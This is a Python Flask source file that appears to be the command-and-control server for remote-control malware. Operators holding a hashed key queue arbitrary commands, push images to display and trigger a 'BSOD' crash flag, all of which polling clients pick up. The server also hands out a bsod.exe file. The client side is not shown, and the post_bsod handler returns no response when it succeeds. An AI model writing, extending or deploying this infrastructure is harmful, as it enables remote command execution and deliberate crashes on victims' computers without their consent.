from flask_limiter.util import get_remote_address
from flask import Response, request, Flask
from flask_limiter import Limiter
from threading import Thread
from hashlib import sha256
from time import sleep

app = Flask(__name__)
limiter = Limiter(get_remote_address, app=app)
commands: list[str] = []
images: list[bytes] = []
bsod_activated: bool = False


@app.route("/command-center", methods=["GET", "POST"])
def command_center() -> Response:
    if request.method == "GET":
        try:
            return Response(commands[0], 200)
        except IndexError:
            return Response("no commands to execute", 204)
    elif request.method == "POST":
        command = request.form.get("command")
        try:
            commands.remove(command)
        except ValueError:
            return Response("command doesnt exist", 400)
        return Response(f"ok, removed {command}", 200)


@app.route("/image-center", methods=["GET"])
def image_center() -> Response:
    try:
        return images[0]
    except IndexError:
        return Response("no images to show", 204)


@app.route("/bsod-center", methods=["GET"])
def bsod_center() -> Response:
    global bsod_activated
    if bsod_activated:
        bsod_activated = False
        return Response("1", 200)
    else:
        return Response("0", 204)


@app.route("/key.txt", methods=["GET"])
def easter_egg() -> Response:
    return Response("Hey, what are you doing there?", 418)


@app.route("/bsod.exe", methods=["GET"])
def server_bsod_exe() -> bytes:
    with open("static/bsod.exe", "rb") as bsod_file:
        return bsod_file.read()


@app.route("/", methods=["GET"])
def home() -> str:
    with open("static/index.html", "r", encoding="utf-8") as index_file:
        return index_file.read()


@app.route("/post_image", methods=["POST"])
def post_image() -> Response:
    if check_key(request.args.get("key")):
        data = request.files["image"].stream.read()
        Thread(target=post_image_thread, args=[data]).start()
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


@app.route("/post_bsod", methods=["POST"])
def post_bsod() -> Response:
    if check_key(request.args.get("key")):
        global bsod_activated
        bsod_activated = True
    else:
        return Response("invalid key", 403)


@app.route("/post_command", methods=["POST"])
def post_command() -> Response:
    key = request.args.get("key")
    command = request.args.get("command")

    if check_key(key):
        commands.append(command)
        return Response("success", 200)
    else:
        return Response("invalid key", 403)


def hash_key(key: str) -> str:
    return sha256(key.encode()).hexdigest()


def post_image_thread(data: bytes) -> None:
    images.append(data)
    sleep(9)
    images.remove(data)


def check_key(key: str) -> bool:
    with open("key.txt", "r") as key_file:
        if key_file.read() == hash_key(key):
            return True
    return False


def main() -> None:
    app.run("0.0.0.0", 80)


if __name__ == "__main__":
    main()
